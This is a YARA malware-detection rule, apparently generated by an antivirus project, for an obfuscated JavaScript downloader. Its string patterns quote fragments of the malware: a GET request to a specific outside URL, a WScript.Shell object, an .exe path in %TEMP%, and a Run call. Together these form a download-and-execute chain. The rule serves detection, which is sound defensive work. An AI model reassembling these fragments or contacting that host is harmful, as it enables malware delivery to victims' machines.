rule sig_20160401_d3e43d488f14ab5164b7f0e9b5932eec {
  meta:
    description = "datamaliciousorder - file 20160401_d3e43d488f14ab5164b7f0e9b5932eec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7feb1ac5884abeab3882e432010ac0c945079ab79e6e4b3dd1d10792a09b484c"

  strings:
    $s1  = "WcJis[HzFff](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "var CneTh = function BuTy() {return WScript[ShOci](\"WScript\"+\".Shell\");}(), ZdwUx = 11;" fullword ascii
    $s3  = "function GkxTai(JigOb, UsqQd){CcqRj = CcqRj * 1; return JigOb - UsqQd;};" fullword ascii
    $s4  = "if (WcJis[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FpUgq(){return NsTqp + \"\";};" fullword ascii
    $s6  = "function JoSl() {return CneTh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1fmLfXojr1b2S.ex\" + \"e\";};" fullword ascii
    $s7  = "if (DeEm && WdgFb() && MeIet){" fullword ascii
    $s8  = "function WdgFb() {return ((DeEm == true) && (DeEm == MeIet)) ? 1 : CcqRj;};" fullword ascii
    $s9  = "function CbNg()" fullword ascii
    $s10 = "function AtUfm(UmiTwj) {var MvaUu = (1, 2, 3, 4, 5, UmiTwj); return MvaUu;};" fullword ascii
    $s11 = "return GkxTai(FxNc, PpaHy);" fullword ascii
    $s12 = "function XdWdu(HtNgk){CneTh[\"R\"+\"un\"](HtNgk, CcqRj, CcqRj);};" fullword ascii
    $s13 = "var AtxOhb = new this[\"Date\"]();" fullword ascii
    $s14 = "MeIet = true; " fullword ascii
    $s15 = "var DeEm = false;" fullword ascii
    $s16 = "function GqKpl(){return ShOci;};" fullword ascii
    $s17 = "DeEm = true; " fullword ascii
    $s18 = "function TrHd(){return 23;};" fullword ascii
    $s19 = "var RhKjn = false;" fullword ascii
    $s20 = "var MeIet = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}